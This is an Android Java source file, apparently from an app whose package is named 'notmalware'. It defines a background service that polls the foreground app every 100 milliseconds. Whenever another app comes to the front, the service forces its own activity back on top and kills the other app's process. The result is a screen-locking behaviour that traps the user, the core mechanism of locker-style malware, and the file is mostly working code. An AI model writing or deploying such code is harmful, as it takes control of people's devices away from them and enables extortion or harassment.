package cc.dnation.notmalware;

import android.app.*;
import android.content.*;
import android.os.*;
import java.util.*;

public class killProcessService extends Service
{
	Context context;
	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		return null;
	}

	@Override
	public void onCreate()
	{
		context = this;

		final Handler h = new Handler(new Handler.Callback(){
				public boolean handleMessage(Message msg)
				{
					ActivityManager am=(ActivityManager)context.getSystemService(ACTIVITY_SERVICE);
					List<ActivityManager.RunningTaskInfo> runningTasks = am.getRunningTasks(1);
					ActivityManager.RunningTaskInfo runningTaskInfo = runningTasks.get(0);
					ComponentName topActivity =runningTaskInfo.topActivity; 
					String packageName =topActivity.getPackageName(); 
				
					if(packageName.equals("cc.dnation.notmalware")){//this app is running?
	}
					else{
						//kill the original one then start this one
						Intent intent=new Intent();
						intent.setClass(context,MainActivity.class);
						intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						startActivity(intent);
						am.killBackgroundProcesses(packageName);
					}
					return false;
				}
			});
		Timer timer;
		TimerTask timertask;
		timer = new Timer();
		timertask = new TimerTask(){
			@Override
			public void run()
			{
				h.obtainMessage().sendToTarget();

			}
		};

		timer.schedule(timertask, 0, 100);//Run TimerTask


	}

	@Override
	public void onStart(Intent intent, int startId)
	{
		// TODO: Implement this method
		super.onStart(intent, startId);


	}
	@Override
	public void onDestroy()
	{
		// TODO: Implement this method
		super.onDestroy();
	}
}
